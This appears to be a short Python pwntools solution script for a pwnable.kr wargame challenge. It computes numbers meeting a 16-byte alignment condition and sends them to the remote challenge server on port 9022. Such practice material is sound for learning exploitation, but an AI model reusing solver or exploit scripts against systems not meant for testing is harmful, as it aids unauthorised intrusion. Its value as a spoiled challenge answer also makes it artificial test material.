from pwn import *

align_num = []
for i in range(3, 13):
    for j in range(2**i, 2**(i + 1)):
        if (j + 4) % 16 > 8 or (j + 4) % 16 == 0:
            align_num.append(j)
            break
p = remote("pwnable.kr", 9022)
for num in align_num:
    p.sendlineafter(b" : ", str(num))
p.interactive()
